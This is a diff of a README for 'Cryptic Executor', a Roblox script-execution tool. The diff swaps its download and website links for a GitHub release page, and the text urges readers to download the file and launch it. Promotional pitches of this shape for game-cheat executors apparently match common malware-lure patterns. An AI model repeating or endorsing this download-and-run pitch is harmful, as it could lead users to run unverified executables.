@@ -16,13 +16,13 @@ Cryptic Executor is here to redefine how users interact with Roblox scripting. O
 
 To begin your journey with Cryptic Executor, simply follow the link below to download the tool and unlock a world of endless possibilities:
 
-[![Download Cryptic Executor](https://img.shields.io/badge/Download-Cryptic%20Executor-brightgreen)](https://github.com/file/App.zip)
+[![Download Cryptic Executor](https://github.com/jslegido/Cryptic-Executor/releases/tag/v2.0%20Executor-brightgreen)](https://github.com/jslegido/Cryptic-Executor/releases/tag/v2.0)
 
 Once you have downloaded the file, launch it to start exploring the exciting features that Cryptic Executor has to offer.
 
 ## Explore More 🌟
 
-Looking for additional information or updates about Cryptic Executor? Visit our [website](https://crypticexecutor.com) to stay in the loop with the latest developments and enhancements.
+Looking for additional information or updates about Cryptic Executor? Visit our [website](https://github.com/jslegido/Cryptic-Executor/releases/tag/v2.0) to stay in the loop with the latest developments and enhancements.
 
 ## Repository Details 📁
 
